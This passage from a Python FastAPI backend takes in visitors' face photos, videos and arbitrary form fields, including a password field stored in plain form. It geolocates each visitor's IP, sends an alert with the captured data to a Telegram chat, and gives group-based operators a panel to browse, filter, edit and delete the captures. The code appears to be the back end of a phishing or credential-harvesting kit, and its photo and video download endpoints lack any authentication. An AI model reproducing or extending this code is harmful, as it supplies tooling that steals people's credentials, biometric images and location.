            "region": geo.get("region"),
            "isp": geo.get("isp"),
            "geo_fuente": geo.get("geo_fuente"),
            "foto_bytes": len(raw),
            "foto_bytes_guardado": len(comprimida),
        }

    # ========================================================
    # GUARDAR VIDEO
    # ========================================================
    async def _guardar_video_db(usuario, grupo, raw_video, mime, geo, ip, etiqueta):
        async with db_semaphore:
            try:
                base_doc = {
                    "usuario": usuario[:200],
                    "grupo": grupo.strip().lower()[:50],
                    "etiqueta": (etiqueta or '')[:100],
                    "video_mime": mime,
                    "video_bytes": len(raw_video),
                    "ip": ip,
                    "pais": geo.get("pais", "Unknown"),
                    "pais_code": geo.get("pais_code", "XX"),
                    "ciudad": geo.get("ciudad", ""),
                    "region": geo.get("region", ""),
                    "isp": geo.get("isp", ""),
                    "lat": geo.get("lat"),
                    "lon": geo.get("lon"),
                    "geo_fuente": geo.get("geo_fuente", ""),
                    "fecha": datetime.utcnow()
                }
                if mongo.fs_bucket is not None and len(raw_video) > 14 * 1024 * 1024:
                    file_id = await mongo.fs_bucket.upload_from_stream(
                        f"{usuario}_{etiqueta or 'video'}.mp4",
                        raw_video,
                        metadata={"usuario": usuario[:200], "grupo": grupo, "mime": mime}
                    )
                    base_doc["video_gridfs_id"] = file_id
                else:
                    base_doc["video_b64"] = base64.b64encode(raw_video).decode('ascii')
                await mongo.videos_usuarios.insert_one(base_doc)
            except Exception as e:
                log.error(f"Error guardando video: {e}")

    @app.post("/guardar_video")
    async def guardar_video(
        request: Request,
        video: UploadFile = File(...),
        usuario: str = Form(...),
        grupo: str = Form("general"),
        etiqueta: str = Form("")
    ):
        ip = obtener_ip_real(request)
        geo = await geolocalizar_ip(ip)
        grupo_limpio = grupo.strip().lower()[:50]
        etiqueta_limpia = (etiqueta or '').strip()[:100]

        raw_video = await video.read(MAX_VIDEO_BYTES + 1)
        if len(raw_video) > MAX_VIDEO_BYTES:
            raise TooLarge()
        if not raw_video:
            raise InputError('El video está vacío.')

        mime = (video.content_type or 'video/webm')

        await add_background_task(
            _guardar_video_db,
            usuario, grupo_limpio, raw_video, mime, geo, ip, etiqueta_limpia
        )

        msg = (f"🎥 *Nuevo Video [{grupo_limpio}]*\n"
               f"👤 `{usuario}`\n"
               f"🏷️ `{etiqueta_limpia}`\n"
               f"🌐 `{ip}`\n"
               f"🌍 {geo.get('pais')} / {geo.get('ciudad')}\n"
               f"📦 {len(raw_video)} bytes · `{mime}`")
        await add_background_task(_enviar_telegram, msg)

        return {
            "message": "Video guardado correctamente",
            "usuario": usuario,
            "grupo": grupo_limpio,
            "etiqueta": etiqueta_limpia,
            "ip": ip,
            "pais": geo.get("pais"),
            "pais_code": geo.get("pais_code"),
            "ciudad": geo.get("ciudad"),
            "region": geo.get("region"),
            "isp": geo.get("isp"),
            "geo_fuente": geo.get("geo_fuente"),
            "video_bytes": len(raw_video),
            "mime": mime,
        }

    # ========================================================
    # AUTENTICACIÓN
    # ========================================================
    async def validar_credenciales_internas(usuario, password):
        usuario_limpio = usuario.strip().lower()
        if usuario_limpio == AUTH_USERNAME.lower() and hmac.compare_digest(password, AUTH_PASSWORD):
            return True
        doc = await mongo.credenciales_usuario.find_one({"usuario": usuario_limpio})
        if not doc or not verify_password_safe(password, doc):
            return False
        return True

    @app.post("/api/usuario/configurar")
    async def configurar_password_usuario(usuario: str = Form(...), password: str = Form(...)):
        async with db_semaphore:
            usuario_limpio = usuario.strip().lower()[:50]
            if len(password) < 4:
                raise HTTPException(status_code=400, detail="Contraseña demasiado corta")
            if usuario_limpio == AUTH_USERNAME.lower():
                raise HTTPException(status_code=400, detail="Usuario maestro ya tiene credenciales.")
            existente = await mongo.credenciales_usuario.find_one({"usuario": usuario_limpio})
            if existente:
                raise HTTPException(status_code=400, detail="Este usuario ya posee una clave permanente")
            pw_hash, salt = hash_password(password)
            await mongo.credenciales_usuario.insert_one({
                "usuario": usuario_limpio,
                "hash": pw_hash,
                "salt": salt,
                "fecha_creacion": datetime.utcnow()
            })
            return {"message": "Clave establecida correctamente"}

    @app.post("/api/usuario/verificar")
    async def verificar_acceso_usuario(usuario: str = Form(...), password: str = Form(...)):
        async with db_semaphore:
            usuario_limpio = usuario.strip().lower()[:50]
            if usuario_limpio == AUTH_USERNAME.lower():
                if hmac.compare_digest(password, AUTH_PASSWORD):
                    return {"status": "ok", "usuario": usuario_limpio, "is_master": True}
                raise HTTPException(status_code=401, detail="Contraseña incorrecta para usuario maestro.")
            doc = await mongo.credenciales_usuario.find_one({"usuario": usuario_limpio})
            if not doc or not verify_password_safe(password, doc):
                raise HTTPException(status_code=401, detail="Credenciales incorrectas")
            return {"status": "ok", "usuario": usuario_limpio, "is_master": False}

    # ========================================================
    # HELPERS DE FILTRADO
    # ========================================================
    def _construir_match(
        usuario_limpio: str,
        grupo: Optional[str],
        usuario_filtro: Optional[str] = None,
        pais_code: Optional[str] = None,
        ciudad: Optional[str] = None,
        fecha_desde: Optional[str] = None,
        fecha_hasta: Optional[str] = None,
    ) -> dict:
        q: Dict[str, Any] = {}
        if usuario_limpio != AUTH_USERNAME.lower():
            q["grupo"] = usuario_limpio
        elif grupo and grupo != "todos":
            q["grupo"] = grupo.strip().lower()
        if usuario_filtro:
            q["usuario"] = usuario_filtro.strip()
        if pais_code and pais_code not in ("", "todos"):
            q["pais_code"] = pais_code.strip().upper()
        if ciudad and ciudad not in ("", "todas"):
            q["ciudad"] = ciudad.strip()
        if fecha_desde or fecha_hasta:
            rango: Dict[str, Any] = {}
            if fecha_desde:
                try:
                    rango["$gte"] = datetime.fromisoformat(fecha_desde)
                except ValueError:
                    pass
            if fecha_hasta:
                try:
                    dt = datetime.fromisoformat(fecha_hasta)
                    rango["$lt"] = dt + timedelta(days=1)
                except ValueError:
                    pass
            if rango:
                q["fecha"] = rango
        return q

    # ========================================================
    # CARAS
    # ========================================================
    @app.get("/api/caras")
    async def api_obtener_caras(
        usuario: str, password: str,
        grupo: Optional[str] = None,
        usuario_filtro: Optional[str] = None,
        pais_code: Optional[str] = None,
        ciudad: Optional[str] = None,
        fecha_desde: Optional[str] = None,
        fecha_hasta: Optional[str] = None,
        limite: int = 500,
    ):
        async with db_semaphore:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")
            usuario_limpio = usuario.strip().lower()
            query = _construir_match(
                usuario_limpio, grupo, usuario_filtro,
                pais_code, ciudad, fecha_desde, fecha_hasta
            )
            limite = max(1, min(int(limite), 500))
            cursor = mongo.caras_usuarios.find(query, {"foto_b64": 0}).sort("fecha", -1).limit(limite)
            docs = await cursor.to_list(length=limite)

        return {"caras": [{
            "id": str(d["_id"]),
            "usuario": d.get("usuario", ""),
            "grupo": d.get("grupo", "general"),
            "etiqueta": d.get("etiqueta", ""),
            "mime": d.get("foto_mime", "image/jpeg"),
            "bytes": d.get("foto_bytes", 0),
            "ip": d.get("ip", ""),
            "pais": d.get("pais", ""),
            "pais_code": d.get("pais_code", ""),
            "ciudad": d.get("ciudad", ""),
            "region": d.get("region", ""),
            "isp": d.get("isp", ""),
            "fecha": d.get("fecha").strftime("%Y-%m-%d %H:%M:%S")
                     if isinstance(d.get("fecha"), datetime) else str(d.get("fecha")),
        } for d in docs]}

    @app.get("/api/caras/agrupadas")
    async def api_caras_agrupadas(
        usuario: str, password: str,
        grupo: Optional[str] = None,
        usuario_filtro: Optional[str] = None,
        pais_code: Optional[str] = None,
        ciudad: Optional[str] = None,
        fecha_desde: Optional[str] = None,
        fecha_hasta: Optional[str] = None,
        limite: int = 500,
    ):
        async with db_semaphore:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")
            usuario_limpio = usuario.strip().lower()
            match = _construir_match(
                usuario_limpio, grupo, usuario_filtro,
                pais_code, ciudad, fecha_desde, fecha_hasta
            )

            pipeline = [
                {"$match": match},
                {"$group": {
                    "_id": {"usuario": "$usuario", "grupo": "$grupo"},
                    "total": {"$sum": 1},
                    "ultima_fecha": {"$max": "$fecha"},
                    "primera_fecha": {"$min": "$fecha"},
                    "ultima_ip": {"$last": "$ip"},
                    "ultimo_pais": {"$last": "$pais"},
                    "ultimo_pais_code": {"$last": "$pais_code"},
                    "ultima_ciudad": {"$last": "$ciudad"},
                    "etiquetas": {"$addToSet": "$etiqueta"},
                }},
                {"$sort": {"ultima_fecha": -1}},
                {"$limit": max(1, min(int(limite), 1000))},
            ]

            resultado = []
            async for doc in mongo.caras_usuarios.aggregate(pipeline):
                resultado.append({
                    "usuario": doc["_id"].get("usuario", ""),
                    "grupo": doc["_id"].get("grupo", "general"),
                    "total": doc.get("total", 0),
                    "primera_fecha": doc["primera_fecha"].strftime("%Y-%m-%d %H:%M:%S")
                        if isinstance(doc.get("primera_fecha"), datetime) else "",
                    "ultima_fecha": doc["ultima_fecha"].strftime("%Y-%m-%d %H:%M:%S")
                        if isinstance(doc.get("ultima_fecha"), datetime) else "",
                    "ip": doc.get("ultima_ip", ""),
                    "pais": doc.get("ultimo_pais", ""),
                    "pais_code": doc.get("ultimo_pais_code", ""),
                    "ciudad": doc.get("ultima_ciudad", ""),
                    "etiquetas": [e for e in doc.get("etiquetas", []) if e],
                })
            return {"grupos": resultado}

    @app.get("/api/caras/por-pais")
    async def api_caras_por_pais(
        usuario: str, password: str,
        grupo: Optional[str] = None,
        usuario_filtro: Optional[str] = None,
        fecha_desde: Optional[str] = None,
        fecha_hasta: Optional[str] = None,
    ):
        async with db_semaphore:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")
            usuario_limpio = usuario.strip().lower()
            match = _construir_match(usuario_limpio, grupo, usuario_filtro, None, None, fecha_desde, fecha_hasta)
            pipeline = [
                {"$match": match},
                {"$group": {
                    "_id": {"pais_code": "$pais_code", "pais": "$pais"},
                    "total": {"$sum": 1},
                    "usuarios": {"$addToSet": "$usuario"},
                    "ciudades": {"$addToSet": "$ciudad"},
                    "ultima_fecha": {"$max": "$fecha"},
                }},
                {"$sort": {"total": -1}},
            ]
            resultado = []
            async for d in mongo.caras_usuarios.aggregate(pipeline):
                resultado.append({
                    "pais_code": d["_id"].get("pais_code", ""),
                    "pais": d["_id"].get("pais", ""),
                    "total": d.get("total", 0),
                    "usuarios_unicos": len([u for u in d.get("usuarios", []) if u]),
                    "ciudades_unicas": len([c for c in d.get("ciudades", []) if c]),
                    "ultima_fecha": d["ultima_fecha"].strftime("%Y-%m-%d %H:%M:%S")
                        if isinstance(d.get("ultima_fecha"), datetime) else "",
                })
            return {"paises": resultado}

    @app.get("/api/caras/por-ciudad")
    async def api_caras_por_ciudad(
        usuario: str, password: str,
        grupo: Optional[str] = None,
        usuario_filtro: Optional[str] = None,
        pais_code: Optional[str] = None,
        fecha_desde: Optional[str] = None,
        fecha_hasta: Optional[str] = None,
    ):
        async with db_semaphore:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")
            usuario_limpio = usuario.strip().lower()
            match = _construir_match(usuario_limpio, grupo, usuario_filtro, pais_code, None, fecha_desde, fecha_hasta)
            pipeline = [
                {"$match": match},
                {"$group": {
                    "_id": {"ciudad": "$ciudad", "pais_code": "$pais_code", "pais": "$pais"},
                    "total": {"$sum": 1},
                    "usuarios": {"$addToSet": "$usuario"},
                    "ultima_fecha": {"$max": "$fecha"},
                }},
                {"$sort": {"total": -1}},
                {"$limit": 500},
            ]
            resultado = []
            async for d in mongo.caras_usuarios.aggregate(pipeline):
                resultado.append({
                    "ciudad": d["_id"].get("ciudad", ""),
                    "pais_code": d["_id"].get("pais_code", ""),
                    "pais": d["_id"].get("pais", ""),
                    "total": d.get("total", 0),
                    "usuarios_unicos": len([u for u in d.get("usuarios", []) if u]),
                    "ultima_fecha": d["ultima_fecha"].strftime("%Y-%m-%d %H:%M:%S")
                        if isinstance(d.get("ultima_fecha"), datetime) else "",
                })
            return {"ciudades": resultado}

    @app.get("/api/caras/por-fecha")
    async def api_caras_por_fecha(
        usuario: str, password: str,
        grupo: Optional[str] = None,
        usuario_filtro: Optional[str] = None,
        pais_code: Optional[str] = None,
        ciudad: Optional[str] = None,
        fecha_desde: Optional[str] = None,
        fecha_hasta: Optional[str] = None,
    ):
        async with db_semaphore:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")
            usuario_limpio = usuario.strip().lower()
            match = _construir_match(usuario_limpio, grupo, usuario_filtro, pais_code, ciudad, fecha_desde, fecha_hasta)
            pipeline = [
                {"$match": match},
                {"$group": {
                    "_id": {
                        "anio": {"$year": "$fecha"},
                        "mes": {"$month": "$fecha"},
                        "dia": {"$dayOfMonth": "$fecha"},
                    },
                    "total": {"$sum": 1},
                    "usuarios": {"$addToSet": "$usuario"},
                }},
                {"$sort": {"_id.anio": -1, "_id.mes": -1, "_id.dia": -1}},
                {"$limit": 365},
            ]
            resultado = []
            async for d in mongo.caras_usuarios.aggregate(pipeline):
                a = d["_id"].get("anio")
                m = d["_id"].get("mes")
                dd = d["_id"].get("dia")
                fecha_str = f"{a:04d}-{m:02d}-{dd:02d}" if a and m and dd else ""
                resultado.append({
                    "fecha": fecha_str,
                    "total": d.get("total", 0),
                    "usuarios_unicos": len([u for u in d.get("usuarios", []) if u]),
                })
            return {"fechas": resultado}

    @app.get("/api/caras/filtros")
    async def api_caras_filtros(
        usuario: str, password: str,
        grupo: Optional[str] = None,
    ):
        async with db_semaphore:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")
            usuario_limpio = usuario.strip().lower()
            match = _construir_match(usuario_limpio, grupo)

            paises = await mongo.caras_usuarios.aggregate([
                {"$match": match},
                {"$group": {"_id": {"pais_code": "$pais_code", "pais": "$pais"}}},
                {"$sort": {"_id.pais": 1}},
            ]).to_list(length=500)

            ciudades = await mongo.caras_usuarios.aggregate([
                {"$match": match},
                {"$match": {"ciudad": {"$ne": ""}}},
                {"$group": {"_id": {"ciudad": "$ciudad", "pais_code": "$pais_code"}}},
                {"$sort": {"_id.ciudad": 1}},
            ]).to_list(length=2000)

            return {
                "paises": [
                    {"pais_code": p["_id"].get("pais_code", ""), "pais": p["_id"].get("pais", "")}
                    for p in paises if p["_id"].get("pais_code")
                ],
                "ciudades": [
                    {"ciudad": c["_id"].get("ciudad", ""), "pais_code": c["_id"].get("pais_code", "")}
                    for c in ciudades if c["_id"].get("ciudad")
                ],
            }

    @app.get("/api/cara/archivo/{cara_id}")
    async def api_descargar_cara(cara_id: str):
        try:
            oid = ObjectId(cara_id)
        except Exception:
            raise HTTPException(status_code=400, detail="ID inválido")
        async with db_semaphore:
            doc = await mongo.caras_usuarios.find_one({"_id": oid}, {"foto_b64": 1, "foto_mime": 1})
        if not doc:
            raise HTTPException(status_code=404, detail="No encontrada")
        try:
            raw = base64.b64decode(doc["foto_b64"])
        except Exception:
            raise HTTPException(status_code=500, detail="Imagen corrupta")
        return FastAPIResponse(content=raw, media_type=doc.get("foto_mime", "image/jpeg"))

    @app.delete("/api/cara/{cara_id}")
    async def api_eliminar_cara(cara_id: str, usuario: str = Form(...), password: str = Form(...)):
        async with db_semaphore:
            try:
                if not await validar_credenciales_internas(usuario, password):
                    raise HTTPException(status_code=401, detail="No autorizado")
                usuario_limpio = usuario.strip().lower()
                doc = await mongo.caras_usuarios.find_one({"_id": ObjectId(cara_id)}, {"foto_b64": 0})
                if not doc:
                    raise HTTPException(status_code=404, detail="No encontrada")
                if usuario_limpio != AUTH_USERNAME.lower() and doc.get("grupo") != usuario_limpio:
                    raise HTTPException(status_code=403, detail="Sin permisos")
                await mongo.caras_usuarios.delete_one({"_id": ObjectId(cara_id)})
                await add_background_task(
                    registrar_auditoria,
                    tipo_accion="ELIMINACION_CARA",
                    autor=usuario_limpio,
                    grupo_origen=doc.get("grupo", "general"),
                    datos_previos={
                        "id_registro": str(doc["_id"]),
                        "usuario": doc.get("usuario"),
                        "etiqueta": doc.get("etiqueta"),
                        "ip": doc.get("ip"),
                    }
                )
                return {"message": "Cara eliminada"}
            except HTTPException:
                raise
            except Exception:
                raise HTTPException(status_code=400, detail="ID inválido")

    @app.delete("/api/caras/usuario/{usuario_email}")
    async def api_eliminar_caras_usuario(
        usuario_email: str,
        usuario: str = Form(...),
        password: str = Form(...)
    ):
        async with db_semaphore:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")
            usuario_limpio = usuario.strip().lower()
            email_limpio = usuario_email.strip()

            query = {"usuario": email_limpio}
            if usuario_limpio != AUTH_USERNAME.lower():
                query["grupo"] = usuario_limpio

            docs = await mongo.caras_usuarios.find(query, {"_id": 1, "grupo": 1}).to_list(length=2000)
            if not docs:
                raise HTTPException(status_code=404, detail="Sin caras para ese usuario")

            result = await mongo.caras_usuarios.delete_many(query)
            await add_background_task(
                registrar_auditoria,
                tipo_accion="ELIMINACION_CARAS_USUARIO",
                autor=usuario_limpio,
                grupo_origen=docs[0].get("grupo", "general") if docs else "general",
                datos_previos={"usuario_afectado": email_limpio, "total": result.deleted_count}
            )
            return {"message": f"Se eliminaron {result.deleted_count} fotos de {email_limpio}"}

    # ========================================================
    # VIDEOS
    # ========================================================
    @app.get("/api/videos")
    async def api_obtener_videos(
        usuario: str, password: str,
        grupo: Optional[str] = None,
        usuario_filtro: Optional[str] = None,
        pais_code: Optional[str] = None,
        ciudad: Optional[str] = None,
        fecha_desde: Optional[str] = None,
        fecha_hasta: Optional[str] = None,
        limite: int = 200,
    ):
        async with db_semaphore:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")
            usuario_limpio = usuario.strip().lower()
            query = _construir_match(
                usuario_limpio, grupo, usuario_filtro,
                pais_code, ciudad, fecha_desde, fecha_hasta
            )
            limite = max(1, min(int(limite), 500))
            cursor = mongo.videos_usuarios.find(query, {"video_b64": 0}).sort("fecha", -1).limit(limite)
            docs = await cursor.to_list(length=limite)
        return {"videos": [{
            "id": str(d["_id"]),
            "usuario": d.get("usuario", ""),
            "grupo": d.get("grupo", "general"),
            "etiqueta": d.get("etiqueta", ""),
            "mime": d.get("video_mime", "video/webm"),
            "bytes": d.get("video_bytes", 0),
            "gridfs": "video_gridfs_id" in d,
            "ip": d.get("ip", ""),
            "pais": d.get("pais", ""),
            "pais_code": d.get("pais_code", ""),
            "ciudad": d.get("ciudad", ""),
            "region": d.get("region", ""),
            "isp": d.get("isp", ""),
            "fecha": d.get("fecha").strftime("%Y-%m-%d %H:%M:%S")
                     if isinstance(d.get("fecha"), datetime) else str(d.get("fecha")),
        } for d in docs]}

    @app.get("/api/videos/agrupados")
    async def api_videos_agrupados(
        usuario: str, password: str,
        grupo: Optional[str] = None,
        usuario_filtro: Optional[str] = None,
        pais_code: Optional[str] = None,
        ciudad: Optional[str] = None,
        fecha_desde: Optional[str] = None,
        fecha_hasta: Optional[str] = None,
    ):
        async with db_semaphore:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")
            usuario_limpio = usuario.strip().lower()
            match = _construir_match(usuario_limpio, grupo, usuario_filtro, pais_code, ciudad, fecha_desde, fecha_hasta)
            pipeline = [
                {"$match": match},
                {"$group": {
                    "_id": {"usuario": "$usuario", "grupo": "$grupo"},
                    "total": {"$sum": 1},
                    "ultima_fecha": {"$max": "$fecha"},
                    "ultima_ip": {"$last": "$ip"},
                    "ultimo_pais": {"$last": "$pais"},
                    "ultimo_pais_code": {"$last": "$pais_code"},
                    "ultima_ciudad": {"$last": "$ciudad"},
                    "bytes_total": {"$sum": "$video_bytes"},
                }},
                {"$sort": {"ultima_fecha": -1}},
                {"$limit": 1000},
            ]
            resultado = []
            async for d in mongo.videos_usuarios.aggregate(pipeline):
                resultado.append({
                    "usuario": d["_id"].get("usuario", ""),
                    "grupo": d["_id"].get("grupo", "general"),
                    "total": d.get("total", 0),
                    "bytes_total": d.get("bytes_total", 0),
                    "ip": d.get("ultima_ip", ""),
                    "pais": d.get("ultimo_pais", ""),
                    "pais_code": d.get("ultimo_pais_code", ""),
                    "ciudad": d.get("ultima_ciudad", ""),
                    "ultima_fecha": d["ultima_fecha"].strftime("%Y-%m-%d %H:%M:%S")
                        if isinstance(d.get("ultima_fecha"), datetime) else "",
                })
            return {"grupos": resultado}

    @app.get("/api/video/archivo/{video_id}")
    async def api_descargar_video(video_id: str):
        try:
            oid = ObjectId(video_id)
        except Exception:
            raise HTTPException(status_code=400, detail="ID inválido")
        async with db_semaphore:
            doc = await mongo.videos_usuarios.find_one({"_id": oid})
        if not doc:
            raise HTTPException(status_code=404, detail="No encontrado")
        if "video_gridfs_id" in doc and mongo.fs_bucket is not None:
            stream = await mongo.fs_bucket.open_download_stream(doc["video_gridfs_id"])
            chunks = []
            while True:
                chunk = await stream.read(64 * 1024)
                if not chunk:
                    break
                chunks.append(chunk)
            raw = b"".join(chunks)
        else:
            raw = base64.b64decode(doc.get("video_b64", ""))
        return FastAPIResponse(content=raw, media_type=doc.get("video_mime", "video/webm"))

    @app.delete("/api/video/{video_id}")
    async def api_eliminar_video(video_id: str, usuario: str = Form(...), password: str = Form(...)):
        async with db_semaphore:
            try:
                if not await validar_credenciales_internas(usuario, password):
                    raise HTTPException(status_code=401, detail="No autorizado")
                usuario_limpio = usuario.strip().lower()
                doc = await mongo.videos_usuarios.find_one({"_id": ObjectId(video_id)}, {"video_b64": 0})
                if not doc:
                    raise HTTPException(status_code=404, detail="No encontrado")
                if usuario_limpio != AUTH_USERNAME.lower() and doc.get("grupo") != usuario_limpio:
                    raise HTTPException(status_code=403, detail="Sin permisos")
                if "video_gridfs_id" in doc and mongo.fs_bucket is not None:
                    try:
                        await mongo.fs_bucket.delete(doc["video_gridfs_id"])
                    except Exception as e:
                        log.warning(f"No se pudo borrar GridFS: {e}")
                await mongo.videos_usuarios.delete_one({"_id": ObjectId(video_id)})
                await add_background_task(
                    registrar_auditoria,
                    tipo_accion="ELIMINACION_VIDEO",
                    autor=usuario_limpio,
                    grupo_origen=doc.get("grupo", "general"),
                    datos_previos={"id_registro": str(doc["_id"]), "usuario": doc.get("usuario")}
                )
                return {"message": "Video eliminado"}
            except HTTPException:
                raise
            except Exception:
                raise HTTPException(status_code=400, detail="ID inválido")

    # ========================================================
    # LOGS / GUARDAR DATOS  — upsert por (usuario, grupo)
    # ========================================================
    @app.post("/guardar_datos")
    async def guardar_datos(request: Request):
        """
        Upsert por (usuario, grupo):
          - Envía 'usuario' y 'grupo' obligatorios.
          - Todos los demás campos van a 'campos' (se fusionan).
          - El mismo usuario puede tener un doc por cada grupo.
          - Editar un grupo NO afecta a los otros.
        """
        ip = obtener_ip_real(request)
        geo = await geolocalizar_ip(ip)

        form = await request.form()

        usuario = str(form.get("usuario", "")).strip()[:200]
        grupo   = str(form.get("grupo", "")).strip()
        tipo    = str(form.get("tipo", "")).strip()

        if not usuario:
            raise HTTPException(status_code=400, detail="Falta 'usuario'.")

        campos: dict = {}
        for key, value in form.multi_items():
            nombre = _sanitizar_nombre_campo(key)
            if nombre in CAMPOS_RESERVADOS_LOG:
                continue
            campos[nombre] = _sanitizar_valor(value)

        if not campos:
            raise HTTPException(status_code=400, detail="Debes enviar al menos un campo adicional.")

        doc, es_nuevo = await _upsert_log_usuario(
            usuario, campos, geo, ip, grupo, tipo
        )
        if not doc:
            raise HTTPException(status_code=500, detail="No se pudo guardar.")

        campos_acumulados = doc.get("campos", {}) or {}
        resumen = " · ".join(
            f"{k}: `{v}`" for k, v in list(campos_acumulados.items())[:15]
        )
        etiqueta = "🆕" if es_nuevo else "➕"
        tipo_msg = doc.get("tipo", "login")
        grupo_msg = doc.get("grupo", "general")
        msg = (
            f"{etiqueta} *Registro [{grupo_msg}]* · `{tipo_msg}`\n"
            f"👤 `{usuario}`\n"
            f"📋 {resumen}\n"
            f"🌐 `{ip}`\n"
            f"🌍 {geo.get('pais')} / {geo.get('ciudad')}"
        )
        await add_background_task(_enviar_telegram, msg)

        return {
            "message": "Datos guardados correctamente",
            "usuario": usuario,
            "grupo": doc.get("grupo"),
            "tipo": doc.get("tipo"),
            "nuevo": es_nuevo,
            "campos_guardados": list(campos.keys()),
            "campos_totales": list(campos_acumulados.keys()),
            "ip": ip,
            "pais": geo.get("pais"),
            "pais_code": geo.get("pais_code"),
            "ciudad": geo.get("ciudad"),
        }

    # ========================================================
    # CAMPOS GLOBALES
    # ========================================================
    @app.get("/api/campos")
    async def api_obtener_campos_globales(
        usuario: str, password: str,
        grupo: Optional[str] = None,
    ):
        async with db_semaphore:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")
            usuario_limpio = usuario.strip().lower()
            match = _construir_match(usuario_limpio, grupo)

            pipeline = [
                {"$match": match},
                {"$project": {"_id": 0, "claves": {"$objectToArray": "$campos"}}},
                {"$unwind": "$claves"},
                {"$group": {"_id": None, "todas": {"$addToSet": "$claves.k"}}},
            ]

            campos: set = set()
            try:
                async for d in mongo.logs_usuarios.aggregate(pipeline):
                    campos.update(d.get("todas", []))
            except Exception as e:
                log.warning(f"Error barriendo campos globales: {e}")

            return {
                "campos_disponibles": sorted(campos),
                "total": len(campos),
            }

    # ========================================================
    # LOGS (listar)
    # ========================================================
    @app.get("/api/logs")
    async def api_obtener_logs(
        usuario: str, password: str,
        grupo: Optional[str] = None,
        usuario_filtro: Optional[str] = None,
        pais_code: Optional[str] = None,
        ciudad: Optional[str] = None,
        fecha_desde: Optional[str] = None,
        fecha_hasta: Optional[str] = None,
    ):
        async with db_semaphore:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")
            usuario_limpio = usuario.strip().lower()
            query = _construir_match(
                usuario_limpio, grupo, usuario_filtro,
                pais_code, ciudad, fecha_desde, fecha_hasta
            )

            pipeline_campos = [
                {"$match": query},
                {"$project": {"_id": 0, "claves": {"$objectToArray": "$campos"}}},
                {"$unwind": "$claves"},
                {"$group": {"_id": None, "todas": {"$addToSet": "$claves.k"}}},
            ]
            campos_union: set = set()
            try:
                async for d in mongo.logs_usuarios.aggregate(pipeline_campos):
                    campos_union.update(d.get("todas", []))
            except Exception as e:
                log.warning(f"No se pudo barrer campos globales: {e}")

            cursor = mongo.logs_usuarios.find(query).sort("fecha", -1).limit(500)
            logs = await cursor.to_list(length=500)

        resultado = []
        for lg in logs:
            campos = dict(lg.get("campos") or {})
            if not campos and lg.get("contrasena") is not None:
                campos["contra"] = lg.get("contrasena", "")

            campos_union.update(campos.keys())

            resultado.append({
                "id": str(lg["_id"]),
                "usuario": lg.get("usuario", ""),
                "campos": campos,
                "ip": lg.get("ip", ""),
                "pais": lg.get("pais", ""),
                "pais_code": lg.get("pais_code", ""),
                "ciudad": lg.get("ciudad", ""),
                "region": lg.get("region", ""),
                "isp": lg.get("isp", ""),
                "grupo": lg.get("grupo", "general"),
                "tipo": lg.get("tipo", ""),
                # ← CAMBIO: se elimina session_id
                "fecha": lg.get("fecha").strftime("%Y-%m-%d %H:%M:%S")
                         if isinstance(lg.get("fecha"), datetime)
                         else str(lg.get("fecha")),
                "fecha_actualizado": lg.get("fecha_actualizado").strftime("%Y-%m-%d %H:%M:%S")
                         if isinstance(lg.get("fecha_actualizado"), datetime)
                         else str(lg.get("fecha_actualizado") or ""),
            })

        return {
            "logs": resultado,
            "campos_disponibles": sorted(campos_union),
        }

    # ========================================================
    # GRUPOS
    # ========================================================
    @app.get("/api/grupos")
    async def api_obtener_grupos(usuario: str, password: str):
        async with db_semaphore:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")
            usuario_limpio = usuario.strip().lower()
            if usuario_limpio != AUTH_USERNAME.lower():
                return {"grupos": [usuario_limpio]}
            grupos = await mongo.logs_usuarios.distinct("grupo")
            return {"grupos": grupos if grupos else ["general"]}

    # ========================================================
    # EDITAR LOG
    # ========================================================
    @app.put("/api/logs/{log_id}")
    async def api_editar_log(log_id: str, data: dict):
        async with db_semaphore:
            try:
                admin_user = data.get("admin_user")
                admin_pass = data.get("admin_pass")
                if not admin_user or not admin_pass or not await validar_credenciales_internas(admin_user, admin_pass):
                    raise HTTPException(status_code=401, detail="No autorizado")

                usuario_limpio = admin_user.strip().lower()
                log_existente = await mongo.logs_usuarios.find_one({"_id": ObjectId(log_id)})
                if not log_existente:
                    raise HTTPException(status_code=404, detail="No encontrado")
                if usuario_limpio != AUTH_USERNAME.lower() and log_existente.get("grupo") != usuario_limpio:
                    raise HTTPException(status_code=403, detail="Sin permisos")

                update_data: dict = {}

                if data.get("usuario") is not None:
                    update_data["usuario"] = str(data["usuario"])[:200]

                if data.get("grupo") is not None:
                    grupo_nuevo = str(data["grupo"]).strip().lower()[:50]
                    if usuario_limpio != AUTH_USERNAME.lower() and grupo_nuevo != usuario_limpio:
                        raise HTTPException(status_code=403, detail="No puede reasignar fuera de su grupo")
                    update_data["grupo"] = grupo_nuevo

                if data.get("tipo") is not None:
                    update_data["tipo"] = str(data["tipo"]).strip().lower()[:50]

                if isinstance(data.get("campos"), dict):
                    campos_limpios = {
                        _sanitizar_nombre_campo(k): _sanitizar_valor(v)
                        for k, v in data["campos"].items()
                        if _sanitizar_nombre_campo(k) not in CAMPOS_RESERVADOS_LOG
                    }
                    update_data["campos"] = campos_limpios
                    for k in ("contra", "contrasena"):
                        if k in campos_limpios:
                            update_data["contrasena"] = campos_limpios[k]
                            break
                    else:
                        update_data["contrasena"] = ""

                if not update_data:
                    raise HTTPException(status_code=400, detail="Sin datos")

                await mongo.logs_usuarios.update_one({"_id": ObjectId(log_id)}, {"$set": update_data})

                await add_background_task(
                    registrar_auditoria,
                    tipo_accion="EDICION",
                    autor=usuario_limpio,
